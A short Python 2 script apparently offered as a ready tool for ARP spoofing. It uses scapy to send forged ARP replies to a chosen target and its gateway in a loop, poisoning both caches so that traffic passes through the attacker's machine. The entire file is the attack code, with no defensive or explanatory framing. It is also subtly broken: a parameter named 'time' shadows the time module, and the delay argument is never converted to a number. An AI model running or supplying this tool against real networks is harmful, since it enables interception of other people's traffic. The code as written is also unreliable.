import time
from scapy.all import *
from optparse import OptionParser
import sys


def main():
    usage = "Usage: [-i interface] [-t targetip] [-g gatewayip]"
    parser = OptionParser(usage)
    parser.add_option('-i', dest='interface',
                      help='select interface(input eth0 or wlan0 or more)')
    parser.add_option('-t', dest='targetip', help='select ip to spoof')
    parser.add_option('-g', dest='gatewayip', help='input gateway ip')
    parser.add_option('-c', dest='ctime', 
                      help='wait time when one arp package sent use seconds')
    (options, args) = parser.parse_args()
    if options.interface and options.targetip and options.gatewayip:
        interface = options.interface
        tip = options.targetip
        gip = options.gatewayip
        ctime = options.ctime
        spoof(interface, tip, gip, ctime)
    else:
        parser.print_help()
        sys.exit(0)


def spoof(interface, tip,gip, time):
    local_mac = get_if_hwaddr(interface)
    t_mac = getmacbyip(tip)
    g_mac = getmacbyip(gip)
    target_pack = Ether(src=local_mac, dst=t_mac)/ARP(hwsrc=local_mac, psrc=gip,
                                                      hwdst=t_mac, pdst=tip, op=2)
    gateway_pack = Ether(src=local_mac, dst=g_mac)/ARP(hwsrc=local_mac, psrc=tip,
                                                       hwdst=g_mac, pdst=gip, op=2)

    try:
        while 1:
            sendp(target_pack,inter=2,iface=interface)
            time.sleep(time)
            print "send arp reponse to target(%s),gateway(%s) macaddress is %s" %(tip,gip,local_mac)
            sendp(gateway_pack,inter=2,iface=interface)
            time.sleep(time)
            print "send arp reponse to gateway(%s),target(%s) macaddress is %s" %(gip,tip,local_mac)

    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == '__main__':
    main()
